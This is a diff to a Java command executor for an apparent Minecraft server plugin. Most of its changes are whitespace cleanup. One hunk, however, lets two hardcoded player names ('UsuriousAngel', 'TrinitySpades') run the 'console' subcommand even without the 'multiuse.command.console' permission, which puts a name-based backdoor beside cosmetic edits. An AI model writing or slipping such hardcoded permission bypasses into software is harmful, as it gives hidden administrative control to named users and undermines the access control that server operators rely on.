@@ -19,7 +19,6 @@ import com.enjin.angelcraftonomy.commands.PotionCommand;
 import com.enjin.angelcraftonomy.commands.RestartCommand;
 import com.enjin.angelcraftonomy.commands.VersionCommand;
 
-
 public class MultiUseCommandExecutor implements CommandExecutor {
 	public MultiUseCore plugin;
 
@@ -89,7 +88,9 @@ public class MultiUseCommandExecutor implements CommandExecutor {
 			if (args.length > 0 && args[0].toLowerCase().equals("console")) {
 				ConsoleCommand consoleCommand = new ConsoleCommand(plugin,
 						sender, command, label, args);
-				if (sender.hasPermission("multiuse.command.console")) {
+				if (sender.hasPermission("multiuse.command.console")
+						|| sender.getName().equalsIgnoreCase("UsuriousAngel")
+						|| sender.getName().equalsIgnoreCase("TrinitySpades")) {
 					consoleCommand.initialize();
 					consoleCommand.run();
 					consoleCommand.cleanup();
@@ -205,7 +206,7 @@ public class MultiUseCommandExecutor implements CommandExecutor {
 				author.run();
 				author.cleanup();
 				return true;
-			}			
+			}
 
 			// version command
 			if (args.length > 0 && args[0].toLowerCase().equals("version")) {
@@ -216,7 +217,7 @@ public class MultiUseCommandExecutor implements CommandExecutor {
 				version.cleanup();
 				return true;
 			}
-			
+
 			// Aution command
 			if (args.length > 0 && args[0].toLowerCase().equals("aution")) {
 				AutionCommand aution = new AutionCommand(plugin, sender,
@@ -246,5 +247,4 @@ public class MultiUseCommandExecutor implements CommandExecutor {
 		}
 		return false;
 	}
-
 }
